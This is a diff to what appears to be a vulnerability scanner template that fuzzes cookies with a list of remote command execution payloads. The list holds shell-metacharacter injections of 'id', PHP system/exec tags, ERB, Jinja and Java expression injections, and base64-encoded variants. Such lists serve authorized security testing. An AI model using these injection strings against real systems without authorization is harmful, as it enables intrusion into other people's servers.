@@ -15,16 +15,8 @@ http:
     payloads:
       rce:
         - "$(id)"
-        - "/*$(id)`id`"
-        - "'i'd"
-        - '"i"d'
-        - '`/usr/bin/id`'
-        - '||/usr/bin/id||'
-        - '$;id'
-        - "i`u`d"
-        - "1;id"
-        - ';";id'
         - "%2560id%2560"
+        - "%26id%26"
         - "%60id%60"
         - "& `id`"
         - "& id &"
@@ -38,6 +30,9 @@ http:
         - "&`id`"
         - "&id"
         - "&id&"
+        - "'.system('id').'"
+        - "'.system('perl -v').'"
+        - "'i'd"
         - "'id'"
         - ");id"
         - ");id;"
@@ -48,6 +43,8 @@ http:
         - "**id**"
         - "*id"
         - "*id*"
+        - "/*$(id)`id`"
+        - "1;id"
         - "; $(id)"
         - "; `id` #"
         - "; `id`"
@@ -56,6 +53,7 @@ http:
         - "; id\n"
         - "; id|"
         - "; |id|"
+        - "Exception('id'.execute().text)"
         - "\n&&id"
         - "\n;id"
         - "\nid"
@@ -74,8 +72,6 @@ http:
         - "\r||$(id)"
         - "\r||`id`"
         - "\r||id"
-        - "`id` #"
-        - "`id` &"
         - "`id`"
         - "`id`#"
         - "`id`&"
@@ -83,9 +79,12 @@ http:
         - "a);id|"
         - "a;id"
         - "a;id;"
+        - "i`u`d"
         - "id"
         - "id;"
         - "id|"
+        - "import os;os.system('id');"
+        - "{% import os %}{{os.system('id')"
         - "| `id` #"
         - "| `id`"
         - "| id"
@@ -104,20 +103,31 @@ http:
         - "||id;"
         - "||id|"
         - "||id||"
-        - '<%= system("id") %>'
-        - '<%25+system("id")+%25>'
-        - "{% import os %}{{os.system('id')"
-        - "import os;os.system('id');"
         - '"><?php echo system("id");?>'
-        - 'T(java.lang.Runtime).getRuntime().exec("id")'
-        - ';phpinfo();'
-        - 'echo `id`;'
-        - 'echo exec(id);'
-        - 'YGlkYA=='
+        - '"i"d'
+        - '$;id'
+        - '; echo `id`;'
+        - '; echo exec(id);'
+        - ';";id'
+        - ';";id;'
+        - '<%25+system("id")+%25>'
+        - '<%= system("id") %>'
+        - '<?php escapeshellcmd("id"); ?>'
+        - '<?php exec("id"); ?>'
+        - '<?php shell_exec("id"); ?>'
+        - '<?php system("id"); ?>'
+        - 'JiZpZCYm'
         - 'O2BpZGA7'
         - 'O2lkOw=='
+        - 'T(java.lang.Runtime).getRuntime().exec("id")'
+        - 'YGlkYA=='
+        - '`/usr/bin/id`'
+        - 'echo `id`;'
+        - 'echo exec(id);'
         - 'fHxgaWRgfHw='
-        - 'JiZpZCYm'
+        - 's:19:"<?php phpinfo(); ?>";'
+        - '||/usr/bin/id||'
+        - "johnsmith@{{Host}}'.system('id').'"
         
     fuzzing:
       - part: cookie
